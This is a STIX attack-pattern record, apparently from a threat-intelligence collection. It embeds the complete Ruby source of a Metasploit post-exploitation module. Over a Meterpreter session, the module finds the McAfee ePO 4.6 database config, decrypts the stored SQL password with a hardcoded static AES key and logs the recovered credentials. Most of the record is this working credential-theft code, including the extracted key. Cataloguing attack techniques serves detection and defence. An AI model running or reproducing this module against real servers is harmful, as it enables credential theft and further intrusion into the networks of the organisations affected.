{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c078941-7e2d-45cc-ad2f-3cbd972943f4",
    "created": "2024-08-14T16:33:08.229774Z",
    "modified": "2024-08-14T16:33:08.229779Z",
    "name": "Windows Gather McAfee ePO 4.6 Config SQL Credentials",
    "description": " This module extracts connection details and decrypts the saved password for the SQL database in use by a McAfee ePO 4.6 server. The passwords are stored in a config file. They are encrypted with AES-128-ECB and a static key.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/epo_sql.rb",
            "external_id": "epo_sql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/dns/resolver'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather McAfee ePO 4.6 Config SQL Credentials',\n        'Description' => %q{\n          This module extracts connection details and decrypts the saved password for the\n          SQL database in use by a McAfee ePO 4.6 server. The passwords are stored in a\n          config file. They are encrypted with AES-128-ECB and a static key.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Nathan Einwechter <neinwechter[at]gmail.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_net_resolve_host\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    # Find out where things are installed\n    print_status('Finding Tomcat install path...')\n    subkeys = registry_enumkeys('HKLM\\Software\\Network Associates\\ePolicy Orchestrator', REGISTRY_VIEW_32_BIT)\n    if subkeys.nil? || subkeys.empty?\n      print_error('ePO 4.6 Not Installed or No Permissions to RegKey')\n      return\n    end\n    # Get the db.properties file location\n    epol_reg_key = 'HKLM\\Software\\Network Associates\\ePolicy Orchestrator'\n    dbprops_file = registry_getvaldata(epol_reg_key, 'TomcatFolder', REGISTRY_VIEW_32_BIT)\n    if dbprops_file.nil? || (dbprops_file == '')\n      print_error('Could not find db.properties file location')\n    else\n      dbprops_file << '/conf/orion/db.properties'\n      print_good('Found db.properties location')\n      process_config(dbprops_file)\n    end\n  end\n\n  def process_config(filename)\n    config = client.fs.file.new(filename, 'r')\n    print_status(\"Processing #{filename}\")\n    contents = config.read\n    config_lines = contents.split(\"\\n\")\n    for line in config_lines\n      line.chomp\n      line_array = line.split('=')\n      case line_array[0]\n      when 'db.database.name'\n        database_name = ''\n        line_array[1].each_byte { |x| database_name << x unless x > 126 || x < 32 }\n      when 'db.instance.name'\n        database_instance = ''\n        line_array[1].each_byte { |x| database_instance << x unless x > 126 || x < 32 }\n      when 'db.user.domain'\n        user_domain = ''\n        line_array[1].each_byte { |x| user_domain << x unless x > 126 || x < 32 }\n      when 'db.user.name'\n        user_name = ''\n        line_array[1].each_byte { |x| user_name << x unless x > 126 || x < 32 }\n      when 'db.port'\n        port = ''\n        line_array[1].each_byte { |x| port << x unless x > 126 || x < 32 }\n      when 'db.user.passwd.encrypted.ex'\n        # ePO 4.6 encrypted password\n        passwd = ''\n        line_array[1].each_byte { |x| passwd << x unless x > 126 || x < 32 }\n        passwd.gsub('\\\\', '')\n        # Add any Base64 padding that may have been stripped out\n        passwd << '=' until (passwd.length % 4 == 0)\n        plaintext_passwd = decrypt46(passwd)\n      when 'db.user.passwd.encrypted'\n        # ePO 4.5 encrypted password - not currently supported, see notes below\n        passwd = ''\n        line_array[1].each_byte { |x| passwd << x unless x > 126 || x < 32 }\n        passwd.gsub('\\\\', '')\n        # Add any Base64 padding that may have been stripped out\n        passwd << '=' until (passwd.length % 4 == 0)\n        plaintext_passwd = 'PASSWORD NOT RECOVERED - ePO 4.5 DECRYPT SUPPORT IS WIP'\n      when 'db.server.name'\n        database_server_name = ''\n        line_array[1].each_byte { |x| database_server_name << x unless x > 126 || x < 32 }\n      end\n    end\n\n    # resolve IP address for creds reporting\n\n    result = client.net.resolve.resolve_host(database_server_name)\n    if result[:ip].nil? || result[:ip].empty?\n      print_error('Could not determine IP of DB - credentials not added to report database')\n      return\n    end\n\n    db_ip = result[:ip]\n\n    print_good(\"SQL Server: #{database_server_name}\")\n    print_good(\"SQL Instance: #{database_instance}\")\n    print_good(\"Database Name: #{database_name}\")\n    if db_ip\n      print_good(\"Database IP: #{db_ip}\")\n    end\n    print_good(\"Port: #{port}\")\n    if user_domain.nil? || (user_domain == '')\n      print_good('Authentication Type: SQL')\n      full_user = user_name\n    else\n      print_good('Authentication Type: Domain')\n      print_good(\"Domain: #{user_domain}\")\n      full_user = \"#{user_domain}\\\\#{user_name}\"\n    end\n    print_good(\"User: #{full_user}\")\n    print_good(\"Password: #{plaintext_passwd}\")\n\n    if db_ip\n      # submit to reports\n      service_data = {\n        address: Rex::Socket.getaddress(db_ip),\n        port: port,\n        protocol: 'tcp',\n        service_name: 'mssql',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: full_user,\n        private_data: plaintext_passwd,\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n      print_good('Added credentials to report database')\n    else\n      print_error('Could not determine IP of DB - credentials not added to report database')\n    end\n  end\n\n  def decrypt46(encoded)\n    encrypted_data = Rex::Text.decode_base64(encoded)\n    aes = OpenSSL::Cipher.new('AES-128-ECB')\n    aes.decrypt\n    aes.padding = 0\n    # Private key extracted from ePO 4.6.0 Build 1029\n    # If other keys are required for other versions of 4.6 - will have to add version\n    # identification routines in to the main part of the module\n    key = [ 94, -100, 62, -33, -26, 37, -124, 54, 102, 33, -109, -128, 49, 90, 41, 51 ]\n    aes.key = key.pack('C*')\n    password = aes.update(encrypted_data) + aes.final\n    # Get rid of all the crazy \\f's that result\n    password.gsub!(/[^[:print:]]/, '')\n    return password\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}